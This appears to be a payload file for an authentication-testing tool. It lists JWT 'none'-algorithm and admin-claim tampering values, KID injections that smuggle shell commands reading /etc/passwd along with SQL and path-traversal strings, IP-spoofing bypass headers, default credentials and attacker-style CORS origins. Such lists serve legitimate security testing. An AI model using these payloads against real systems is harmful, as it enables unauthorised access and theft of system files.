"""HaakAuth — Test vectors and payloads for auth testing modules"""

# JWT Algorithm None variants
JWT_ALG_NONE = ["none", "None", "NONE", "nOnE", "nonE", "NoNe"]

# JWT claim tampering payloads
JWT_ADMIN_CLAIMS = [
    {"role": "admin"},
    {"role": "administrator"},
    {"is_admin": True},
    {"admin": True},
    {"isAdmin": True},
    {"groups": ["admin"]},
    {"roles": ["admin", "superuser"]},
    {"privilege": "admin"},
    {"level": 0},
    {"access_level": "admin"},
    {"user_type": "admin"},
    {"permissions": ["*"]},
]

# JWT KID injection payloads
JWT_KID_INJECTIONS = [
    "../../dev/null",
    "/dev/null",
    "'; SELECT 1--",
    "' UNION SELECT 1--",
    "../../../../../../etc/passwd",
    "|cat /etc/passwd",
    ";cat /etc/passwd",
    "aa' || '1'='1",
    "key_file_not_found",
    "",
]

# Common ID parameter names
IDOR_PARAM_NAMES = [
    "id", "user_id", "userId", "uid", "account_id", "accountId",
    "profile_id", "profileId", "customer_id", "customerId",
    "order_id", "orderId", "doc_id", "docId", "record_id",
    "emp_id", "empId", "ticket_id", "ticketId", "invoice_id",
    "project_id", "projectId", "org_id", "orgId", "team_id",
    "file_id", "fileId", "document_id", "documentId",
    "company_id", "companyId", "tenant_id", "tenantId",
    "resource_id", "resourceId", "item_id", "itemId",
    "pid", "cid", "rid", "fid", "did", "tid", "oid",
]

# Auth bypass headers (IP spoofing + internal traffic simulation)
AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-IP": "127.0.0.1"},
    {"Via": "1.1 localhost"},
    {"Forwarded": "for=127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Real-IP": "10.0.0.1"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-Forwarded-For": "::1"},
]

# Path traversal bypass patterns (format string with {path})
PATH_BYPASS_PATTERNS = [
    "/{path}",
    "/{path}/",
    "/{path}/.",
    "//{path}",
    "/./{path}",
    "/{path}%20",
    "/{path}%09",
    "/{path}..;/",
    "/{path};",
    "/%2e/{path}",
    "/{path}#",
    "/{path}?",
    # Case variations (applied to each path segment)
]

# Method override headers
METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
    "X-Original-Method",
]

# HTTP methods to test
HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]

# Content types to test
CONTENT_TYPES = [
    "application/json",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/plain",
    "application/xml",
    "text/xml",
    None,  # no content-type header
]

# Common API version paths
API_VERSIONS = ["/v0/", "/v1/", "/v2/", "/v3/", "/api/", "/api/v1/", "/api/v2/", "/api/v3/"]

# Default credentials for Basic auth testing
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "user"),
    ("admin", "Password1"),
    ("administrator", "administrator"),
    ("guest", "guest"),
    ("demo", "demo"),
    ("api", "api"),
    ("admin", ""),
    ("", ""),
]

# Common logout endpoints
LOGOUT_ENDPOINTS = [
    "/logout", "/signout", "/sign-out", "/log-out",
    "/api/logout", "/api/signout", "/api/auth/logout",
    "/api/auth/signout", "/api/v1/logout", "/api/v1/auth/logout",
    "/auth/logout", "/auth/signout", "/session/destroy",
    "/api/session/logout", "/api/users/logout",
]

# Common password reset endpoints
PASSWORD_RESET_ENDPOINTS = [
    "/forgot-password", "/reset-password", "/password/reset",
    "/api/auth/forgot", "/api/auth/reset", "/api/password/reset",
    "/api/forgot-password", "/api/v1/auth/forgot",
    "/auth/forgot", "/auth/reset", "/users/forgot-password",
    "/account/forgot-password", "/api/users/forgot-password",
]

# Username enumeration test usernames
ENUM_USERNAMES = [
    "admin", "administrator", "root", "test", "user",
    "info", "support", "help", "demo", "guest",
    "nonexistent_user_haakauth_test_12345",
    "this-user-definitely-does-not-exist-xyz",
]

# Common security headers to audit
SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "medium",
        "description": "HSTS header missing — browser may connect via HTTP",
        "cwe": "CWE-319",
    },
    "X-Content-Type-Options": {
        "severity": "low",
        "description": "X-Content-Type-Options missing — MIME type sniffing possible",
        "cwe": "CWE-693",
    },
    "X-Frame-Options": {
        "severity": "medium",
        "description": "X-Frame-Options missing — clickjacking possible",
        "cwe": "CWE-1021",
    },
    "Content-Security-Policy": {
        "severity": "medium",
        "description": "CSP header missing — XSS mitigation reduced",
        "cwe": "CWE-693",
    },
    "Referrer-Policy": {
        "severity": "low",
        "description": "Referrer-Policy missing — referrer leakage possible",
        "cwe": "CWE-200",
    },
    "Permissions-Policy": {
        "severity": "info",
        "description": "Permissions-Policy missing",
        "cwe": "CWE-693",
    },
}

# CORS test origins
CORS_TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "https://target.com.evil.com",  # subdomain-like
]
